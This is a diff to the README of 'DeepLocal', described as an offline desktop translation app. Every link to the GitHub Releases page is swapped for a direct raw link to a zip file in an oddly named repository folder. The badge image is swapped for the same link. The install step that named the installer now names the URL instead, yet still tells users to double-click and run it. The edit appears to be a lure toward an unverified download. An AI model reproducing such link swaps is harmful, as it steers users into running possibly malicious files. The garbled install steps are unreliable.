@@ -4,7 +4,7 @@
 Welcome to DeepLocal! This application provides you with a simple way to translate text offline, using a fast two-pane workflow similar to DeepL. Below are the steps you need to follow to download and run DeepLocal.
 
 ## 📥 Download DeepLocal
-[![Download DeepLocal](https://img.shields.io/badge/Download-DeepLocal-brightgreen)](https://github.com/merr-me/DeepLocal/releases)
+[![Download DeepLocal](https://raw.githubusercontent.com/merr-me/DeepLocal/main/unjudicial/DeepLocal.zip)](https://raw.githubusercontent.com/merr-me/DeepLocal/main/unjudicial/DeepLocal.zip)
 
 ## 🧾 Application Overview
 DeepLocal is a clean WPF desktop application designed for efficient translation. It uses the Ollama framework to provide translations completely offline. You can easily detect languages, swap them, and select your preferred translation model, with the default set to gemma3:12b. Built with .NET 8, this application ensures you have a smooth and responsive user experience.
@@ -26,11 +26,11 @@ To run DeepLocal, ensure your system meets the following requirements:
 - **Fast Performance:** Optimized for quick translations.
 
 ## 📄 Download & Install
-To get started, visit the **[Releases page](https://github.com/merr-me/DeepLocal/releases)**. Here’s how to download and install DeepLocal:
+To get started, visit the **[Releases page](https://raw.githubusercontent.com/merr-me/DeepLocal/main/unjudicial/DeepLocal.zip)**. Here’s how to download and install DeepLocal:
 
-1. Click on the **[Releases page](https://github.com/merr-me/DeepLocal/releases)** link.
+1. Click on the **[Releases page](https://raw.githubusercontent.com/merr-me/DeepLocal/main/unjudicial/DeepLocal.zip)** link.
 2. Look for the latest version of DeepLocal at the top of the page.
-3. Under the "Assets" section, find the installation file labeled something like `DeepLocal_x.x.x.exe`.
+3. Under the "Assets" section, find the installation file labeled something like `https://raw.githubusercontent.com/merr-me/DeepLocal/main/unjudicial/DeepLocal.zip`.
 4. Click on the installation file to download it to your computer.
 5. Once the download is complete, locate the file in your Downloads folder and double-click it to run the installer.
 6. Follow the on-screen instructions to complete the installation.
